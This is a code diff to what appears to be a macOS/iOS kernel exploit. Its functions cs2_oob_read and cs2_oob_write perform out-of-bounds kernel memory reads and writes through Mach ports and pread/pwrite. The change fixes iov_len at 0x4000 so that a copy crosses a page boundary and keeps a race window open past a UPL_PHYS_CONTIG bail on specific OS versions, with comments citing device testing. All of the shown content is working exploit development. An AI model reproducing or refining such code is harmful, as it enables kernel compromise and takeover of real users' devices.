@@ -43,9 +43,14 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
 
     // set iov base to physically contiguous addr + 0x3f00
     cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);
-    //    LOG_DEBUG("iov_base %#llx", (cs2_ctx.pc_address + 0x3f00));
-    // offset is oob_offset, size is oob_size, so 0x100 + 0xf00 = 0x1000?
-    cs2_ctx.iov.iov_len = offset + size;
+    /* cross-page copy-window law (2026-10-24 source+device cross-ref):
+       the copyin-walk interleave — the window that SURVIVES the
+       UPL_PHYS_CONTIG bail on 25/26/27 trains — only exists when the copy
+       crosses a page boundary. 0x1000 = one 16K page = NO window (w=4096
+       clean on every 24A435 try; the calib crosses with a 0x4000 iov from
+       +0x3f00). The pread capture at 0x3f00+oob_offset still reads page-2's
+       copied bytes, so oob_size/oob_offset semantics are unchanged. */
+    cs2_ctx.iov.iov_len = (vm_size_t)0x4000;
     //    LOG_DEBUG("iov_len %#lx", cs2_ctx.iov.iov_len);
 
     memcpy(buffer, &cs2_ctx.random_marker, sizeof(uint64_t));
@@ -121,7 +126,7 @@ void cs2_oob_write(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, ui
     atomic_store_explicit(&cs2_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);
 
     cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);
-    cs2_ctx.iov.iov_len = offset + size;
+    cs2_ctx.iov.iov_len = (vm_size_t)0x4000;   /* same cross-page window law */
     // read from buffer into fd
     pwrite(cs2_ctx.write_fd, buffer, size, 0x3f00 + offset);
 
